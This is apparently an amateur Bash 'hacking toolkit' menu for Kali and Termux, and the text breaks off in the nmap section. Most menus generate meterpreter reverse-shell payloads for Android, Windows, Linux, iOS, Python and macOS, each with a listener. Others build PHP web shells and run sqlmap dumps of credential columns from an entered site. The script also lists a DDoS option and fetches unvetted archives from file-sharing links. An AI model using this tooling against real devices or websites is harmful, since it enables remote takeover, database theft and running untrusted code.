#!/bin/bash

green='\e[1;32m'
cyan='\e[1;36m'
red='\e[0;31m'
blue='\e[1;34m'
white='\e[1;37m'
yellow='\e[1;33m'
my_ip=$(curl -s https://api.ipify.org)

rasma(){
	clear
	echo -e $red """

			██╗  ██╗ █████╗ ██╗  ██╗███████╗  
			██║  ██║██╔══██╗██║ ██╔╝██╔════╝  
			███████║███████║█████╔╝ ███████╗  
			██╔══██║██╔══██║██╔═██╗ ╚════██║  
			██║  ██║██║  ██║██║  ██╗███████║  
			╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
				$yellow Welcome $green($blue$my_ip$green)
				$yellow By :$red MOHAMED$green HACKER  
	"""

}
rasma
main(){
	echo -e " $green[$yellow 1 $green]$blue Fix_KaiL\n "
	sleep 0.2
	echo -e " $green[$yellow 2 $green]$blue PayLoaD\n"
	sleep 0.2
	echo -e " $green[$yellow 3 $green]$blue Hashing\n"
	sleep 0.2
	echo -e " $green[$yellow 4 $green]$blue metasploit\n"
	sleep 0.2
	echo -e " $green[$yellow 5 $green]$blue kail Hunter\n"
	sleep 0.2
	echo -e " $green[$yellow 6 $green]$blue Web Site $green($red HAK $green)\n"
	sleep 0.2
	echo -e " $green[$yellow 7 $green]$blue TOoLs HACKeR\n"
	sleep 0.2
	echo -e " $green[$yellow 8 $green]$blue DDos Attack\n"
	sleep 0.2
	echo -e " $green[$yellow 9 $green]$blue service$green($red Termux $green)\n"
	sleep 0.2
	echo -e " $green[$yellow X $green]$blue Exit\n"
	sleep 0.2
	echo -e $white 
	read -p "[ H_A_K_5 ]~# " MOHAMED
	if [ $MOHAMED = 1 ];then
		Fix_KaiL
	elif [ $MOHAMED = 2 ];then
		PayLoaD
	elif [ $MOHAMED = 3 ]; then
		cd .model
		bash .hashing.sh
	elif [ $MOHAMED = 4 ]; then
		cd .model
		bash .msf.sh
	elif [ $MOHAMED = 5 ]; then
		kailHunter
	elif [ $MOHAMED = 6 ]; then
		web
	elif [ $MOHAMED = 7 ];then
		TOoLs
	elif [ $MOHAMED = 8 ]; then
		ddos
	elif [ $MOHAMED = 9 ]; then
		serve
	elif [ "$MOHAMED" = "X" ] || [ "$MOHAMED" = "x" ]; then
		exit 
	elif [ "$MOHAMED" = "ip" ] || [ "$MOHAMED" = "IP" ]; then
		ip 
	else :
		rasma
		main
	fi


}


Fix_KaiL(){
	clear
	echo -e $cyan 
	figlet  -f big "           Fix_KaiL   "
	echo -e " $green[$yellow 1 $green]$blue fix sound problm" ;sleep 0.2
	echo -e " $green[$yellow 2 $green]$blue fix  vpn  problm" ;sleep 0.2
	echo -e " $green[$yellow 3 $green]$blue fix bluetooth" ;sleep 0.2
	echo -e " $green[$yellow 4 $green]$blue fix armitage" ;sleep 0.2
	echo -e " $green[$yellow 5 $green]$blue fix wifi" ;sleep 0.2
	echo -e " $green[$yellow 6 $green]$blue update sources.list + copyFIle $green($yellow VMware $green)" ;sleep 0.2
	echo -e " $green[$yellow 0 $green]$blue Back" ;sleep 0.2
	echo -e $white
	read -p "[ H_A_K_5 / Fix_KaiL ]~# " fixed

	if [ $fixed = 1 ];then
		echo -e "$green [*]$yellow fix sound problm start ..."
		sleep 3
		systemctl --user enable pulseaudio && systemctl --user start pulseaudio
		apt-get install pulseaudio 
		pulseaudio -D
		Fix_KaiL
	elif [ $fixed = 2 ]; then
		echo -e "$green [*]$yellow fix vpn problm start ..."
		sleep 3
		apt-get install network-manager-openvpn-gnome -y
		apt-get install network-manager-pptp -y
		apt-get install network-manager-pptp-gnome -y
		apt-get install network-manager-strongswan -y
		apt-get install network-manager-vpnc -y
		apt-get install network-manager-vpnc-gnome -y
		/etc/init.d/network-manager restart
		Fix_KaiL
	elif [ $fixed = 3 ]; then
		echo -e "$green [*]$yellow fix bluetooth problm start ..."
		sleep 3
		sudo lsmod | grep blue
		systemctl enable bluetooth.service
		systemctl start bluetooth.service
		Fix_KaiL
	elif [ $fixed = 4 ]; then
		echo -e "$green [*]$yellow fix armitage problm start ..."
		sleep 3
		clear
		echo -e "$green==========>$white Download Armitage $green<=========="
		wget http://download2268.mediafire.com/8buw6ywhe4kg/6o7gi1e6pf5l0t1/armitage.zip
		unzip armitage.zip -C /usr/share/armitage/
		service postgresql start
		msfdb init
		Fix_KaiL
	elif [ $fixed = 5  ]; then
		echo -e "$green [*]$yellow fix wifi problm start ..."
		sleep 3
		airmon-ng start wlan0
		ifconfig wlan0mon down
		iwconfig wlan0mon mode monitor
		ifconfig wlan0mon up
		airodump-ng wlan0mon
		Fix_KaiL
	elif [ $fixed = 6 ]; then
		echo -e "$green[*]$yellow Update sources start..."
		sleep 3 
		echo "deb http://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list 
		echo "deb-src http://http.kali.org/kali kali-rolling main non-free contrib" >> /etc/apt/sources.list
		echo -e "$yellow Done $red ^_^ "
		sleep 3
		clear
		echo -e "$green[*]$yellow update kali...";		echo -e "$white To Exit $red [ctrl + c ]";
		sleep 3 
		apt-get update 
		apt-get upgrade && apt-get dist-apgrad -y
		echo -e "$yellow Done $red ^_^ "
		echo -e "$green[*]$yellow Fix $cyan copy $white + $cyan ZOom $green($red VMware $green)"
		apt-get install open-vm-tools-desktop fuse
		echo -e "$yellow Done $red ^_^ "
		sleep 8
		Fix_KaiL
	elif [ $fixed = 0 ]; then
		rasma
		main
	else :
		Fix_KaiL
	fi
}	
PayLoaD(){
	clear 
	echo -e $red
	figlet  -f big "           PaylOaD   "
	echo -e "$green[!]$red What Are Using \n "
	echo -e "$green [$red 1 $green]$cyan KAiL $yellow && $cyan PaROoT \n"
	echo -e "$green [$red 2 $green]$cyan TERMUX\n"
	echo -e "$green [$red 0 $green]$cyan Back \n"
	echo -e $white
	read -p "[ H_A_K_5 / PayLoaD ]~# " payload
	if [ $payload = 1 ] ; then 
		clear 
		echo -e $red
		figlet  -f big "           PaylOaD   "
		echo -e $red"[1]"$green" Payload Android" ;sleep 0.2
		echo
		echo -e $red"[2]"$green" Payload Windows" ;sleep 0.2
		echo
		echo -e $red"[3]"$green" Payload Linux" ;sleep 0.2
		echo
		echo -e $red"[4]"$green" Payload Iso $yellow($red apple $yellow)" ;sleep 0.2
		echo
		echo -e $red"[5]"$green" Payload Python" ;sleep 0.2
		echo
		echo -e $red"[6]"$green" Payload Mac" ;sleep 0.2
		echo
		echo -e $red"[0]"$green" Back\n" ;sleep 0.2
		echo -e $white
		read -p "[ H_A_K_5 / PayLoaD / ROoT ]~# " root
		if [ $root = 1 ] ; then 
			clear
			echo -e  "$yellow Payload $red Android\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.apk
			mv $name.apk HAK5_PaYLOad
			clear
			echo -e "$yellow The PaylOAD in $red HAK5_PaYLOad"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ $root = 2 ] ; then 
			clear
			echo -e  "$yellow Payload $red Windows\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe -o $name.exe
			mv $name.exe HAK5_PaYLOad
			clear
			echo -e "$yellow The PaylOAD in $red HAK5_PaYLOad"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear ' -x 'exploit '
		elif [ $root = 3 ] ; then 
			clear
			echo -e  "$yellow Payload $red Windows\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port -o $name.elf
			mv $name.elf HAK5_PaYLOad
			clear
			echo -e "$yellow The PaylOAD in $red HAK5_PaYLOad"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ $root = 4 ] ; then 
			clear
			echo -e  "$yellow Payload $red Iso $green($red apple $green)\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -o $name.api
			mv $name.api HAK5_PaYLOad
			clear
			echo -e "$yellow The PaylOAD in $red HAK5_PaYLOad"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ $root = 5 ] ; then 
			clear
			echo -e  "$yellow Payload $red Python\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.py
			mv $name.py HAK5_PaYLOad
			clear
			echo -e "$yellow The PaylOAD in $red HAK5_PaYLOad"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit'
		elif [ $root = 6 ] ; then 
			clear
			echo -e  "$yellow Payload $red Python\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$host LPORT=$port -o $name.macho
			mv $name.macho HAK5_PaYLOad
			clear
			echo -e "$yellow The PaylOAD in $red HAK5_PaYLOad"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit'
		elif [ $root = 0 ] ; then
			clear
			echo -e $green
			figlet "		MOHAMED"
			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
			sleep 0.1
			echo -e "$yellow By : $green MOHAMED $cyan HACKER"
			sleep 0.1
			echo -e "$yellow Telegram $red @HcmohtatefOfficial"
			sleep 0.1
			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
			sleep 3
			rasma
			main
		else :
			PayLoaD
		fi
	elif [ $payload = 2 ]; then
		clear 
		echo -e $red ;sleep 0.2
		figlet  -f big "           T-PaylOaD   " ;sleep 0.2
		echo -e $red"[1]"$green" Payload Android" ;sleep 0.2
		echo
		echo -e $red"[2]"$green" Payload Windows" ;sleep 0.2
		echo
		echo -e $red"[3]"$green" Payload Linux" ;sleep 0.2
		echo
		echo -e $red"[4]"$green" Payload Iso $yellow($red apple $yellow)" ;sleep 0.2
		echo
		echo -e $red"[5]"$green" Payload Python" ;sleep 0.2
		echo
		echo -e $red"[6]"$green" Payload Mac" ;sleep 0.2
		echo
		echo -e $red"[0]"$green" Back\n" ;sleep 0.2
		echo -e $white
		read -p "[ H_A_K_5 / PayLoaD / termux ]~# " termux
		if [ $termux = 1 ] ; then 
			clear
			echo -e  "$yellow Payload $red Android\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.apk
			mv $name.apk /sdcard/HAK5
			clear
			echo -e "$yellow The PaylOAD in $red HAK5"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ $termux = 2 ] ; then 
			clear
			echo -e  "$yellow Payload $red Windows\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe -o $name.exe
			mv $name.exe /sdcard/HAK5
			clear
			echo -e "$yellow The PaylOAD in $red HAK5"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear ' -x 'exploit '
		elif [ $termux = 3 ] ; then 
			clear
			echo -e  "$yellow Payload $red Windows\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port -o $name.elf
			mv $name.elf /sdcard/HAK5 ;clear
			echo -e "$yellow The PaylOAD in $red HAK5"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ $termux = 4 ] ; then 
			clear
			echo -e  "$yellow Payload $red Iso $green($red apple $green)\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -o $name.api
			mv $name.api /sdcard/HAK5
			clear
			echo -e "$yellow The PaylOAD in $red HAK5"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ $termux = 5 ] ;then 
			clear
			echo -e  "$yellow Payload $red Python\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> $name.py
			mv $name.py /sdcard/HAK5
			clear
			echo -e "$yellow The PaylOAD in $red HAK5"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit'
		elif [ $termux = 6 ] ; then 
			clear
			echo -e  "$yellow Payload $red Python\n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make PayLOaD..."
			sleep 2
			msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$host LPORT=$port -o $name.macho
			mv $name.macho /sdcard/HAK5
			clear
			echo -e "$yellow The PaylOAD in $red HAK5"
			sleep 5
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit'
		elif [ $termux = 0 ] ; then
			clear
			echo -e $green
			figlet "		MOHAMED"
			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
			sleep 0.1
			echo -e "$yellow By : $green MOHAMED $cyan HACKER"
			sleep 0.1
			echo -e "$yellow Telegram $red @HcmohtatefOfficial"
			sleep 0.1
			echo -e "$red++++++++++++++++++++++++++++++++++++++" 
			sleep 3
			rasma
			main
		else :
			PayLoaD
		fi
	elif [ $payload = 0  ]; then
		clear
		echo -e $green
		figlet "          MOHAMED"
		echo -e "$red++++++++++++++++++++++++++++++++++++++" 
		sleep 0.1
		echo -e "$yellow By : $green MOHAMED $cyan HACKER"
		sleep 0.1
		echo -e "$yellow Telegram $red @HcmohtatefOfficial"
		sleep 0.1
		echo -e "$red++++++++++++++++++++++++++++++++++++++" 
		sleep 3
		rasma
		main
	else :
		PayLoaD
	fi

}
kailHunter(){
	clear
	printf "$red"
	figlet KaliNethunter
	echo -e $white"==============>$red KaliNethunter $white<=============="
	sleep 3
	pkg install curl ruby -y
	curl -LO https://raw.githubusercontent.com/Hax4us/Nethunter-In-Termux/master/kalinethunter88o9io
	chmod +x kalinethunter
	./kalinethunter
	chmod +x finaltouchup.sh
	read -p $yellow "please insert name your pc android ex: (arm,arm64) " kail
	mv finaltouchup.sh kali-$kail
	startkali
	bash finaltouchup.sh
	apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6
	sleep 3
	rasma
	main
}
web(){
    pict(){
    	clear
		printf """
		$red▄▄      ▄▄ ▄▄▄▄▄▄▄▄  ▄▄▄▄▄    $cyan    ▄▄    ▄▄     ▄▄     ▄▄   ▄▄▄           
		$red██      ██ ██▀▀▀▀▀▀  ██▀▀▀██  $cyan    ██    ██    ████    ██  ██▀            
		$red▀█▄ ██ ▄█▀ ██        ██    ██ $cyan    ██    ██    ████    ██▄██              
		$red ██ ██ ██  ███████   ██    ██ $cyan    ████████   ██  ██   █████              
		$red ███▀▀███  ██        ██    ██ $cyan    ██    ██   ██████   ██  ██▄            
		$red ███  ███  ██▄▄▄▄▄▄  ██▄▄▄██  $cyan    ██    ██  ▄██  ██▄  ██   ██▄           
		$red ▀▀▀  ▀▀▀  ▀▀▀▀▀▀▀▀  ▀▀▀▀▀    $cyan    ▀▀    ▀▀  ▀▀    ▀▀  ▀▀    ▀▀"""
	}
	pict
	printf "\n\n"
	echo -e "$green[!]$red What Are Using \n "
	echo -e "$green [$red 1 $green]$cyan KAiL $yellow && $cyan PaROoT \n"
	echo -e "$green [$red 2 $green]$cyan TERMUX\n"
	echo -e "$green [$red 0 $green]$cyan Back \n"
	echo -e $white
	read -p "[ H_A_K_5 / WEB ]~# " web
	if [ "$web" = "1" ] ; then
		pict
		echo -e "\n\n\n"
		printf "$green[$white 1 $green]$blue SQL Search" ;sleep 0.2
		echo ""
		printf "$green[$white 2 $green]$blue SQL InGEcTiOn" ;sleep 0.2
		echo ""                                                                                                                                                                                         
		printf "$green[$white 3 $green]$blue SheLL InGEcTiOn" ;sleep 0.2
		echo ""
		printf "$green[$white 4 $green]$blue Admin Finde" ;sleep 0.2
		echo ''
		printf "$green[$white 5 $green]$blue Nmap_ScAn" ;sleep 0.2
		echo ''
		printf "$green[$white 6 $green]$blue INDEX HTML" ;sleep 0.2
		echo ""
		printf "$green[$white 0 $green]$blue BACK" ;sleep 0.2
		echo -e "$white"
		echo ""
		read -p "[ H_A_K_5 / WEB_HAK ]~# " web1
		if [ $web1 = 1 ]; then
			SQL_s
		elif [ $web1 = 2  ]; then
			SQL_H
		elif [ $web1 = 3 ]; then
			SheLL_H
		elif [ $web1 = 4 ]; then
			admin
		elif [ $web1 = 5 ]; then
			nmap-p
		elif [ $web1 = 6 ]; then
			index
		elif [ $web1 = 0 ]; then
			rasma
			main
		else :
			web
		fi
	elif [ "$web" = "2" ]; then
		pict
		echo -e "\n"
		printf "$green[$white 1 $green]$blue SQL Search" ;sleep 0.2
		echo ""
		printf "$green[$white 2 $green]$blue SQL InGEcTiOn" ;sleep 0.2
		echo ""                                                                                                                                                                                         
		printf "$green[$white 3 $green]$blue SheLL InGEcTiOn" ;sleep 0.2
		echo ""
		printf "$green[$white 4 $green]$blue Admin Finde" ;sleep 0.2
		echo ''
		printf "$green[$white 5 $green]$blue Nmap_ScAn" ;sleep 0.2
		echo ''
		printf "$green[$white 6 $green]$blue INDEX HTML" ;sleep 0.2
		echo ""
		printf "$green[$white 0 $green]$blue BACK" ;sleep 0.2
		echo -e "$white"
		echo ""
		read -p "[ H_A_K_5 / WEB_HAK ]~# " web2 
		if [ "$web2" = "1" ];then
			clear
			echo -e $red
			figlet  -f big "           SQL_S   "
			echo 
			read -p "Enter The Ip Web SQL : " SQL
			cd .model
			echo -e $green"[$red*$green] $yellow Starting Search... " 
			ruby .SQL.rb $SQL id
			clear
			mv website.txt /sdcard/HAK5
			clear
			echo -e "$red[$yellow+$red]$blue The Web in /HOME/website.txt"
			sleep 4
			web	
		elif [ "$web2" = "2" ]; then
			clear
			printf "$red"
			figlet  -f big "           SQL_HAK   "
			echo
			echo -e "$green Please input the Web $yellowEX : $red($blue http://testphp.vulnweb.com/artists.php?artist=1$red)\n "
			read -p "Enter The Web : " SQL
			python2 .model/.sqlmap/sqlmap.py -u $SQL --dbs 
			read -p "Enter The data : " dbs 
			python2 .model/.sqlmap/sqlmap.py -u $SQL -C $dbs --tables
			read -p "Enter The Tables : " tab 
			python2 .model/.sqlmap/sqlmap.py -u $SQL -D $dbs -T $tab --columns
			read -p "Enter The columns (admin,pass) : " usr
			python2 .model/.sqlmap/sqlmap.py -u $SQL -D $dbs -T $tab -C $usr --dump 
			echo
			echo -n -e $red"		Enter Any Kay To Exit"
			read Enter 
			sleep 5
			web
		elif [ "$web2" = "3" ]; then
			clear
			printf "$red"
			figlet  -f big "           SheLL_HAK   "
			echo
			echo -e "$green[$red!$green]$yellow To Make The SheLL you must install msfconsole... \n"
			read -p "Enter The Host: " host
			read -p "Enter The Port: " port
			read -p "Enter the Name: " name
			echo -e "$green [~] $yellow Make SheLL..."
			msfvenom -p php/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f raw > $name.php
			mv $name.php /sdcard/HAK5
			clear
			echo -e "$green[$cyan*$green] $green Done $white>>$yellow The SheLL in /sdcard/HAK5 "
			echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
			sleep 5
			msfconsole -x 'use exploit/multi/handler' -x 'set PAYLOAD php/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
		elif [ "$web2" = "4" ]; then
			admin
		elif [ "$web2" = "5" ]; then
			nmap-p
		elif [ "$web2" = "6" ]; then
			index-t
		elif [ "$web2" = "0" ]; then
			web
		else :
			web
		fi
	elif [ "$web" = "0" ]; then
		rasma
		main
	else :
		web
	fi
}
index-t(){
	clear
	figlet INDEX
	echo 
	echo -e -n "$red DO You Want Download The index $green(y/n)$yellow: " ;read in 
	if [ "$in" = "y" ] || [ "$in" = "Y" ];then
		echo -e "$red[*] $yellow Starting..."
		sleep 2
		wget http://download2265.mediafire.com/zm8669wvt0cg/909e0drdp0yemi3/index_web.zip ;mv index_web.zip /sdcard/HAK5
		clear ;echo -e "$cyan The INDEX in HAK5 " ;sleep 4 ; web
	elif [ "$in" = "n" ] || [ "$in" = "N" ]; then
		web
	else :
		web
	fi	
}
index(){
	clear
	figlet INDEX
	echo 
	echo -e -n "$red DO You Want Download The index $green(y/n)$yellow: " ;read in 
	if [ "$in" = "y" ] || [ "$in" = "Y" ];then
		echo -e "$red[*] $yellow Starting..."
		sleep 2
		wget http://download2265.mediafire.com/zm8669wvt0cg/909e0drdp0yemi3/index_web.zip 
		clear ;echo -e "$cyan The INDEX in HAK5 " ;sleep 4 ; web
	elif [ "$in" = "n" ] || [ "$in" = "N" ]; then
		web
	else :
		web
	fi	
}
SQL_s(){
	clear
	echo -e $red
	figlet  -f big "           SQL_S   "
	echo 
	read -p "Enter The Ip Web SQL : " SQL
	cd .model
	echo -e $green"[$red*$green] $yellow Starting Search... " 
	ruby .SQL.rb $SQL id
	clear
	mv website.txt ~
	clear
	echo -e "$red[$yellow+$red]$blue The Web in /HOME/website.txt"
	sleep 4
	web	
}
SQL_H(){
	clear
	printf "$red"
	figlet  -f big "           SQL_HAK   "
	echo
	echo -e "$green Please input the Web $yellowEX : $red($blue http://testphp.vulnweb.com/artists.php?artist=1$red)\n "
	read -p "Enter The Web : " SQL
	sqlmap -u $SQL --dbs 
	read -p "Enter The data : " dbs 
	sqlmap -u $SQL -C $dbs --tables
	read -p "Enter The Tables : " tab 
	sqlmap -u $SQL -D $dbs -T $tab --columns
	read -p "Enter The columns (admin,pass) : " usr
	sqlmap -u $SQL -D $dbs -T $tab -C $usr --dump 
	echo
	echo -n -e $red"		Enter Any Kay To Exit"
	read Enter 
	sleep 5
	web
}   
SheLL_H(){
	clear
	printf "$red"
	figlet  -f big "           SheLL_HAK   "
	echo
	echo -e "$green[$red!$green]$yellow To Make The SheLL you must install msfconsole... \n"
	read -p "Enter The Host: " host
	read -p "Enter The Port: " port
	read -p "Enter the Name: " name
	echo -e "$green [~] $yellow Make SheLL..."
	msfvenom -p php/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f raw > $name.php
	clear
	echo -e "$green[$cyan*$green] $green Done $white>>$yellow The SheLL in HAK5 "
	echo -e "$green[$red~$green]$cyan MSF Starting $red[ $yellow X = Ctrl + C $red ]"
	sleep 5
	msfconsole -x 'use exploit/multi/handler' -x 'set PAYLOAD php/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'clear' -x 'exploit '
}
admin(){
	sleep 3
	clear
	cd .model
	python2 .findadmin.py
	echo -n -e $red"		Enter Any Kay To Exit"
	read Enter 
	sleep 5
	web
}
s_p(){
	clear
	echo -e """                                                                       
		$red   ▄▄▄▄       ▄▄▄▄                     $white ▄▄    ▄▄     ▄▄     ▄▄   ▄▄▄ 
		$red ▄█▀▀▀▀█    ██▀▀▀▀█                    $white ██    ██    ████    ██  ██▀  
		$red ██▄       ██▀        ▄█████▄  ██▄████▄$white ██    ██    ████    ██▄██    
		$red  ▀████▄   ██         ▀ ▄▄▄██  ██▀   ██$white ████████   ██  ██   █████    
		$red      ▀██  ██▄       ▄██▀▀▀██  ██    ██$white ██    ██   ██████   ██  ██▄  
		$red █▄▄▄▄▄█▀   ██▄▄▄▄█  ██▄▄▄███  ██    ██$white ██    ██  ▄██  ██▄  ██   ██▄ 
		$red  ▀▀▀▀▀       ▀▀▀▀    ▀▀▀▀ ▀▀  ▀▀    ▀▀$white ▀▀    ▀▀  ▀▀    ▀▀  ▀▀    ▀▀"""
	echo
	echo -e $red"	----------------------------------$yellow}$cyan Nmap $yellow{$red----------------------------------\n"
}
nmap-p(){
	s_p
	echo -e "$red[$cyan 1 $red] $white Check The Ip" ;sleep 0.2
	echo -e "$red[$cyan 2 $red] $white All PC In NetwOrK" ;sleep 0.2
	echo -e "$red[$cyan 3 $red] $white SCan For All Tcp PortS" ;sleep 0.2
	echo -e "$red[$cyan 4 $red] $white Treat all hosts as online" ;sleep 0.2
	echo -e "$red[$cyan 5 $red] $white Only scan specified ports" ;sleep 0.2
	echo -e "$red[$cyan 6 $red] $white Probe open ports to determine service" ;sleep 0.2
	echo -e "$red[$cyan 7 $red] $white Enable IPv6 scanning" ;sleep 0.2
	echo -e "$red[$cyan 8 $red] $white Never do DNS resolution" ;sleep 0.2
	echo -e "$red[$cyan 9 $red] $white Ping SCan" ;sleep 0.2
	echo -e "$red[$cyan 10 $red] $white UDP Scan" ;sleep 0.2
	echo -e "$red[$cyan 11 $red] $white List Scan" ;sleep 0.2
	echo -e "$red[$cyan 12 $red] $white TCP SYN/ACK" ;sleep 0.2
	echo -e "$red[$cyan 13 $red] $white TCP SYN/Connect" ;sleep 0.2
	echo -e "$red[$cyan 14 $red] $white IP protocol scan" ;sleep 0.2
	echo -e "$red[$cyan 15 $red] $white Back" ;sleep 0.2
	echo -e $white
	read -p "[ H_A_K_5 / SCan_HAK ]~# " scan
	if [ $scan = 1  ];then 
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target : " ip ;sleep 2
		echo -e "$green[$red*$green]$cyan Starting.."
		nmap $ip
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 2 ]; then
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n\n "
		echo -e "$green[$red*$green]$cyan Starting.."
		nmap  192.168.1.*
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 3 ]; then
		s_p
		echo -e "		$red-----$cyan}$green Enter Ip or Target $cyan{$red-----$white\n "
		read -p "Enter Ip or Target : " ip ;sleep 2 
		echo -e "$green[$red*$green]$cyan Starting.."
		sudo nmap -Pn -sS -sU -T4 -A -v $ip
		echo -e -n "$red			Enter Any key To Exit";read Enter
		nmap-p
	elif [ $scan = 4 ]; then
		s_p
